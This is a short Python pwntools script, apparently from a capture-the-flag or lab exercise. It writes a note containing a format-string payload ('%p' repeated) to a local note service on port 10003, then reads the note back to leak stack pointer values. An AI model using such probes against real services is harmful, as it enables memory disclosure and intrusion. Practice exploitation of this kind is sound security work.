from pwn import *
import time


context.log_level= 'debug'

conn = remote('localhost',10003)

conn.recvuntil(b'Want to (R)ead or (W)rite a note?')
conn.send(b'W\r\n')


conn.recvuntil(b'Please send: note_id password content')

conn.send(b'1234432 test %p%p%p%p%p%p%p%p%p%p')

conn.close()

conn = remote('localhost', 10003)

conn.recvuntil(b'Want to (R)ead or (W)rite a note?\n')

conn.send(b'R\r\n')

conn.recvuntil(b'Please send: note_id password')

conn.send(b'1234432 test\r\n')

conn.recv(timeout = 10)

conn.close()

